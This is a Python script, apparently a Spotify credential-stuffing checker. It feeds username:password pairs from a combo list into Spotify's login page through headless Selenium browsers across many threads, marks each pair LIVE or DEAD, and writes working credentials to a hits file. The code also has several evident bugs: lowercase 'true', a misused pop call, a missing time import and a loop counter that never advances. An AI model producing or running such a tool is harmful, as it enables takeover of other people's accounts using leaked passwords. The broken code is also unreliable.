from selenium import webdriver #Imports WebDriver
from selenium.webdriver.common.by import By
from static.logogen import ui
from threading import Thread, active_count
from colorama import init, Fore
def CR345(allowedthreads):
    currentcombo = 0
    hitqueue = []
    def hitque():
        while true:
            global hitqueue
            if len(hitqueue) != 0:
                file = open("./CR345/Hits.txt", "a")
                file.write(f"{hitque.pop[0]}\n")
                file.close()

    def checker(username, password, account):
        global hitqueue
        recheck = True
        while recheck == True:
            recheck = False
            try:
                URL = "https://accounts.spotify.com/en/login/"
                options = webdriver.ChromeOptions()
                options.headless = True
                options.add_experimental_option('excludeSwitches', ['enable-logging'])
                driver = webdriver.Chrome(options=options)
                driver.get(URL)
                driver.find_element(By.ID, "login-username").send_keys(username)
                driver.find_element(By.ID, "login-password").send_keys(password)
                driver.find_element(By.ID, "login-button").click()
                time.sleep(1.5)
                if driver.current_url != "https://accounts.spotify.com/en/status":
                    print(f"{Fore.RED}[DEAD]{username}:{password}")
                elif driver.current_url == "https://accounts.spotify.com/en/status":
                    print(f"{Fore.GREEN}[LIVE]{username}:{password}")
                    hitqueue.append(account)
                driver.close()
            except:
                recheck = True
    ui("CR345")
    combos = open("./combos.txt", "r").readlines()
    threads = int(input("Threads:"))
    combolist = []
    for line in combos:
        combo = line.strip()
        combolist.append(combo)
    while currentcombo < len(combolist):
        while active_count() < allowedthreads:
            combo = combolist[currentcombo]
            splitcombo = combo.split(":")
            t = Thread(target=checker, args=(splitcombo[0], splitcombo[1], combo,))
            t.start()
        